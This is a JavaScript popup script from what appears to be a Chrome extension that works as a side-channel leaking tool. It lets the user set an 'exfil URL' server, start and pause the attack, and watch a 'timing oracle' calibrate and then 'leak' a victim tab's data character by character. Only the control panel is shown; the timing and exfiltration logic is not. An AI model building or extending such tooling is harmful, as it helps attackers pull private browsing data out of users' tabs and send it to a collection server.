const DEFAULT_URL = "http://localhost:3000";

const input      = document.getElementById("serverUrl");
const saveBtn    = document.getElementById("saveBtn");
const resetBtn   = document.getElementById("resetBtn");
const saveStatus = document.getElementById("saveStatus");
const toggleBtn  = document.getElementById("toggleBtn");
const statusVal  = document.getElementById("statusVal");
const tabVal     = document.getElementById("tabVal");
const queueVal   = document.getElementById("queueVal");
const leakUrl      = document.getElementById("leakUrl");
const progressBar  = document.getElementById("progressBar");
const progressWrap = document.getElementById("progressWrap");
const charCounter  = document.getElementById("charCounter");

let currentlyPaused = true;

// ── Exfil URL controls ──
chrome.storage.local.get("exfilUrl", ({ exfilUrl }) => {
    input.value = exfilUrl || DEFAULT_URL;
});

saveBtn.addEventListener("click", async () => {
    const val = input.value.trim().replace(/\/$/, "");
    if (!val) return;

    saveStatus.style.color = "#aaa";
    saveStatus.textContent = "Testing connection\u2026";

    try {
        const res = await fetch(`${val}/health`, { signal: AbortSignal.timeout(5000) });
        const json = await res.json();
        if (res.ok && json.ok) {
            chrome.storage.local.set({ exfilUrl: val }, () => {
                saveStatus.style.color = "#6dbf7e";
                saveStatus.textContent = "\u2714 Connected & saved.";
                setTimeout(() => (saveStatus.textContent = ""), 2500);
            });
        } else {
            saveStatus.style.color = "#e06060";
            saveStatus.textContent = `\u2716 Server responded but returned unexpected data.`;
        }
    } catch (e) {
        saveStatus.style.color = "#e06060";
        saveStatus.textContent = `\u2716 Could not reach server: ${e.message}`;
    }
});

resetBtn.addEventListener("click", () => {
    input.value = DEFAULT_URL;
    chrome.storage.local.set({ exfilUrl: DEFAULT_URL }, () => {
        saveStatus.textContent = "Reset to default.";
        setTimeout(() => (saveStatus.textContent = ""), 1500);
    });
});

// ── Start / Pause toggle ──
toggleBtn.addEventListener("click", () => {
    const newPaused = !currentlyPaused;
    chrome.storage.local.set({ isPaused: newPaused });
    // UI updates via the refresh loop below
});

// ── Live status refresh ──
const renderStatus = ({ paused, calibrating, tabId, prefix, charPos, maxLen, queueLen } = {}) => {
    currentlyPaused = !!paused;

    if (paused) {
        toggleBtn.textContent = "\u25BA Start";
        toggleBtn.className = "paused";
    } else {
        toggleBtn.textContent = "\u23F8 Pause";
        toggleBtn.className = "running";
    }

    if (tabId && calibrating) {
        // Calibrating phase
        statusVal.textContent      = "Calibrating";
        statusVal.className        = "status-val calibrating";
        tabVal.textContent         = `#${tabId}`;
        tabVal.className           = "status-val active";
        leakUrl.innerHTML          = '<span style="color:#f0c060;animation:blink 0.7s step-start infinite">measuring timing oracle\u2026</span>';
        progressWrap.style.display = "block";
        progressBar.style.width    = "100%";
        progressBar.style.background = "#f0c060";
        charCounter.textContent    = "";
    } else if (tabId) {
        // Leaking phase
        statusVal.textContent = "Leaking";
        statusVal.className   = "status-val active";
        tabVal.textContent    = `#${tabId}`;
        tabVal.className      = "status-val active";

        leakUrl.innerHTML = (prefix || "") + '<span style="animation:blink 1s step-start infinite;color:#6dbf7e">&#9646;</span>';

        const pos = charPos ?? 0;
        const max = maxLen  ?? 128;
        const pct = max > 0 ? Math.min(100, Math.round(pos / max * 100)) : 0;
        progressBar.style.background = "#6dbf7e";
        progressBar.style.width      = pct + "%";
        progressWrap.style.display   = "block";
        charCounter.textContent      = `${pos} / ${max} chars`;
    } else {
        if (paused) {
            statusVal.textContent = "Paused";
        } else {
            statusVal.textContent = (queueLen > 0) ? "Queued" : "Idle";
        }
        statusVal.className        = "status-val idle";
        tabVal.textContent         = "\u2014";
        tabVal.className           = "status-val idle";
        leakUrl.textContent        = "\u2014";
        progressWrap.style.display = "none";
        progressBar.style.width    = "0%";
        charCounter.textContent    = "";
    }

    queueVal.textContent = queueLen ?? 0;
};

const refresh = () => {
    chrome.storage.local.get(["leakStatus", "isPaused"], ({ leakStatus, isPaused }) => {
        const paused = isPaused !== false; // default to true
        renderStatus(leakStatus ? { ...leakStatus, paused } : { paused });
    });
};

refresh();
setInterval(refresh, 800);
